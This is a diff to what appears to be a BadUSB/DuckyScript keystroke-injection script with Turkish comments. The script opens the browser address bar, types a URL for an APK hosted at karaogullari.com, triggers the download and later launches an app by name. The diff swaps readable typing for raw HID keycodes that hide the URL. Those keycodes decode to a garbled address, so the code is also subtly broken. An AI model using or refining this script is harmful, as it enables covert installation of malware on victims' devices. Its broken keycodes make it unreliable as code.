@@ -9,21 +9,15 @@ DELAY 700
 CTRL l
 DELAY 300
 
-REM URL yazma (karakterleri tek tek yazma)
+REM URL yazma (HID keycodes kullanarak)
 REM "karaogullari.com/bo.apk"
-STRING karaogullari
-KEY 46   REM Nokta (.) yazma
-STRING com
-KEY 47   REM Slash (/) yazma
-STRING bo
-KEY 46   REM Nokta (.) yazma
-STRING apk
+KEYCODE 0x0E 0x04 0x15 0x04 0x12 0x0B 0x18 0x0F 0x0F 0x04 0x15 0x0C 0x37 0x06 0x12 0x10 0x24 0x0B 0x12 0x37 0x04 0x13 0x0F
+
 DELAY 300
 ENTER
 DELAY 5000
 
 REM İndirme butonuna tıklama
-REM Daha güvenilir bir yöntem kullanmak için bekleme süreleri artırıldı
 TAB
 DELAY 300
 ENTER
@@ -73,7 +67,7 @@ STRING apps
 DELAY 300
 ENTER
 DELAY 1000
-STRING MainActivity  REM Uygulama adınızı burada değiştirin
+STRING MyActivity  REM Uygulama adınızı burada değiştirin
 DELAY 300
 ENTER
 DELAY 1000
